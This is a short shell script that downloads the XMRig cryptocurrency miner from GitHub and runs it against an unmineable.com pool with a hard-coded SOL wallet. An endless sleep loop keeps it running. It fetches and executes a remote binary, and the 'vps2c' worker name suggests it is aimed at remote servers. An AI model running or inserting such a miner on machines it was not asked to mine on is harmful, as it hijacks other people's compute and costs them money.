#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-focal-x64.tar.gz
tar xvaf xmrig-6.24.0-focal-x64.tar.gz
cd xmrig-6.24.0
./xmrig -o rx.unmineable.com:3333 -a rx -k -u SOL:9kexzJUm3ZRDvKw3K18V5zw6Raemu7NjfE4uiHzijEJd.vps2c -p x

while [ 1 ]; do
  sleep 3
done

sleep 999
 
